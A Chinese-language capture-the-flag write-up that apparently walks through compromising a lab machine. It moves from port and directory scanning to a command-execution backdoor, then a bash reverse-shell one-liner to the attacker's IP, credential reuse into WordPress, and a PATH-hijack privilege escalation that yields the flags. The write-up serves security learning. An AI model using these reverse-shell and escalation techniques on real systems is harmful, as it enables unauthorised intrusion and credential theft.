# 信息收集与初步探测

起手还是老规矩，先扫出靶机的 IP 地址。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l     
...
192.168.205.140 08:00:27:03:6d:aa       (Unknown)
...
```

确定目标 IP 为 192.168.205.140，接着跑一次全端口扫描看开了哪些服务。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 0-65535 192.168.205.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 23:43 -0500
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

开了 80 和 8080 两个 Web 端口。当时我先去访问了默认端口，顺手抓取一下页面源码。

```bash
┌──(kali㉿kali)-[~]
└─$ curl 192.168.205.140                                           
<!DOCTYPE html><html><body style="height:100vh;display:flex;justify-content:center;align-items:center;margin:0;"><h1>Welcome to Maze-Sec</h1></body></html>
<!-- keys1.dsz -->
```

页面里直接塞了个域名 `keys1.dsz`，显然是需要配 host 的。我直接把它写进 `/etc/hosts` 里，方便后续测试。

```bash
┌──(kali㉿kali)-[~]
└─$ echo '192.168.205.140 keys1.dsz' | sudo tee -a /etc/hosts
192.168.205.140 keys1.dsz
```

当时我看了一眼 80 端口，发现是个 WordPress，但简单测了一下没找到什么现成的漏洞。8080 端口看起来是个没什么内容的欢迎页，于是我决定挂上字典爆破一下 8080 的目录。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://keys1.dsz:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
...
index.html           (Status: 200) [Size: 156]
backdoor.php         (Status: 500) [Size: 0]
```

扫出了一个极度可疑的 `backdoor.php`，但返回了 500 错误。这说明文件存在，只是缺少正确运行的参数导致服务器报错。

# 参数 Fuzz 与初始突破

既然是 backdoor，肯定要通过 GET 或 POST 传参执行命令。我直接用 ffuf 去 Fuzz 这个参数名。

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u 'http://keys1.dsz:8080/backdoor.php?FUZZ=id' --fw 1
...
0                       [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 220ms]
```

成功跑出了一个参数名为 `0`。立刻用 curl 验证一下是否能执行 `id` 命令。

```bash
┌──(kali㉿kali)-[~]
└─$ curl 'http://keys1.dsz:8080/backdoor.php?0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

命令执行确认无误。接着构造反弹 Shell 的 payload，把 shell 弹到我本地的 8888 端口。

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://keys1.dsz:8080/backdoor.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.205.128/8888+0>%261'"
```

Kali 这边成功接到了弹回来的 shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 46580
bash: cannot set terminal process group (1): Inappropriate ioctl for device
...
www-data@292178caf8f3:/var/www/html$ echo $0
echo $0
bash
```

为了操作方便，我顺手把 shell 升级成了交互式 tty。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# 踩坑：虚假的 Root 权限

在当前目录下随便翻了翻，本能地打个 `env` 看一下环境变量，结果有大发现。

```bash
www-data@292178caf8f3:/home$ env
...
ROOT_PASSWORD=root123.
HOSTNAME=292178caf8f3
...
```

环境变量里居然直接写着 `ROOT_PASSWORD=root123.`。我立刻用这个密码切到了 root。

```bash
www-data@292178caf8f3:/home$ su -
Password: 
root@292178caf8f3:~#  id
uid=0(root) gid=0(root) groups=0(root)
```

切过去后发现高兴得太早了，环境极其干净，什么都没有。结合前面的 HOSTNAME 和现在的状况，反应过来刚才打下的是个 Docker 容器，这里拿到的只是容器内的 root，对主线毫无帮助。

# 柳暗花明：重回 WordPress

虽然容器是条死胡同，但那个 `root123.` 的密码可能别有用途。我回想起刚开始看 80 端口的 WordPress 时，发现过一个叫 `todd` 的作者用户名。

死马当活马医，去 `http://keys1.dsz/wordpress/wp-login.php` 试了一下 `todd` 和密码 `root123.`，居然直接进后台了。
有了 WP 后台权限，接下来就是轻车熟路打插件拿 Shell。

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 45172
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

这次打进来的这台机器才是真正的宿主机。还是老套路，先稳定 shell。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

退到 `/home` 目录看了一眼，用户多得离谱。

```bash
www-data@Key1:/home$ ls -al
total 56
drwxr-xr-x 14 root     root     4096 Feb 15 02:24 .
...
drwx------  2 bot      bot      4096 Feb 26 00:43 bot
drwx------  2 byxs     byxs     4096 Feb 26 00:43 byxs
...
drwxr-xr-x  2 sublarge sublarge 4096 Feb 26 00:43 sublarge
...
```

在这里磨蹭了半天，本以为会有什么弱密码之类的设计，结果全是无用功。

# 权限提升：环境变量劫持

在系统里四处翻找可疑文件时，我注意到了一个奇怪的自定义二进制文件 `/usr/local/bin/key1`。

```bash
www-data@Key1:/tmp$ /usr/local/bin/key1
Current user: www-data
Now is user cyl turn
www-data@Key1:/tmp$ ls -al /usr/local/bin/key1
-rwx--x--x 1 root root 17464 Feb 15 07:15 /usr/local/bin/key1
```

看输出，它打印了 `Current user: www-data`。我顺手看了下它的帮助文档。

```bash
www-data@Key1:/tmp$ /usr/local/bin/key1 -h
Options:
  -h, --help              Display this help message and exit
  -p, --password PASSWORD Output root password format with provided password
Standard logic:
  1. Reads users from /opt/user.txt
  2. Compares current user with a selected user
```

这里它的逻辑是判断当前用户是否和某个选中的用户一致。既然它能输出 `Current user: www-data`，很大概率是在底层调用了系统的 `whoami` 命令，而且没有用绝对路径。这就是经典的 PATH 环境变量劫持场景。

我直接在 `/tmp` 下写一个假的 `whoami` 脚本，让它输出我们想要伪造的用户名 `sublarge`，然后把 `/tmp` 塞到环境变量的最前面。

```bash
www-data@Key1:/tmp$ echo 'echo -n "sublarge"' > whoami
www-data@Key1:/tmp$ chmod +x whoami
www-data@Key1:/tmp$ export PATH=/tmp:$PATH
www-data@Key1:/tmp$ cat whoami
echo -n "sublarge"
```

环境配好后，疯狂运行这个 `key1` 程序。可以看到它每运行一次，就会轮换一个目标用户。

```bash
www-data@Key1:/tmp$ /usr/local/bin/key1
Current user: sublarge
Now is user xnz turn
...
www-data@Key1:/tmp$ /usr/local/bin/key1
Current user: sublarge
Now is user root turn
www-data@Key1:/tmp$ /usr/local/bin/key1
Current user: sublarge
Now is user da turn
www-data@Key1:/tmp$ /usr/local/bin/key1
sublarge: 9cesSxZfHJS8DNxieFUx
```

在反复执行几次后，程序终于匹配上了我们伪造的身份，吐出了 `sublarge` 用户的密码。

# 最终接管验证

拿到了有效密码，剩下的流程就毫无悬念了。先切到 `sublarge`，然后再根据前面 `key1 -h` 提示的功能，获取 root 的密码。

```bash
www-data@Key1:/tmp$ su sublarge
Password: 
sublarge@Key1:/tmp$ id
uid=1003(sublarge) gid=1003(sublarge) groups=1003(sublarge)
sublarge@Key1:/tmp$ /usr/local/bin/key1 -p 9cesSxZfHJS8DNxieFUx
root: mc6gMij9hFetO6S0WNrd 
```

直接拿着吐出来的 root 密码切换身份，双 flag 到手。

```bash
sublarge@Key1:/tmp$ su -
Password: 
root@Key1:~#  id
uid=0(root) gid=0(root) groups=0(root)
root@Key1:~#  cat /root/root.txt /home/sublarge/user.txt 
flag{root-2d8e0ca998ebd0a3abdee36468170c99}
flag{user-163aafb4875076a94dcf6a701d3d06bc}
```